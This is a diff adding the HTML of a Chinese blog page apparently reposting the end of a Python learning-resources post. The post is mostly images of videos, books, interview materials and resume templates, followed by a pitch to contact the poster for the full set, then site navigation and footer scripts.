+<p><img src="https://images2.imgbox.com/6a/e1/dbe2a9Wk_o.png" alt=""></p> 
+<p>######视频</p> 
+<p><img src="https://images2.imgbox.com/8f/50/T9HuFz2d_o.png" alt="image1"></p> 
+<p>######书籍</p> 
+<p><img src="https://images2.imgbox.com/45/6d/TwYHR0CT_o.png" alt="image2"></p> 
+<p>资源较为敏感，未展示全面，需要的下面获取</p> 
+<p><img src="https://images2.imgbox.com/5e/88/JdQqMoZh_o.png" alt=""> ### 3️⃣Python面试集锦</p> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm1001201430015502_745"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>面试资料</h6> 
+<p><img src="https://images2.imgbox.com/da/e5/24ARB9id_o.png" alt="在这里插入图片描述"><img src="https://images2.imgbox.com/d4/d7/CBgxbROT_o.png" alt="在这里插入图片描述"></p> 
+<h6><a id="httpsblogcsdnnet2201_75362610articledetails135947058httpsblogcsdnnet2201_75362610articledetails135938431spm1001201430015501httpsblogcsdnnet2201_75362610articledetails135885947spm1001201430015501httpsblogcsdnnetJava_ZZZZZarticledetails135861576spm1001201430015502_749"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135947058"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135938431?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/2201_75362610/article/details/135885947?spm=1001.2014.3001.5501"></a><a href="https://blog.csdn.net/Java_ZZZZZ/article/details/135861576?spm=1001.2014.3001.5502"></a>简历模板</h6> 
+<p><img src="https://images2.imgbox.com/0a/58/4DEnPDk6_o.png" alt="在这里插入图片描述"></p> 
+<p><img src="https://images2.imgbox.com/7d/32/sd8Th6YT_o.png" alt=""></p> 
+<p><strong>因篇幅有限，资料较为敏感仅展示部分资料，添加上方即可获取👆</strong></p> 
+<p><strong>------ 🙇‍♂️ 本文转自网络，如有侵权，请联系删除 🙇‍♂️ ------</strong></p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/ed4408ea24966108ce440bd1b7fa9309/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Redis -- hash哈希</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/49b50f9cba4bffe7cc161099dc2a66a9/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">从零开始的网络安全--Windows系统安全</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
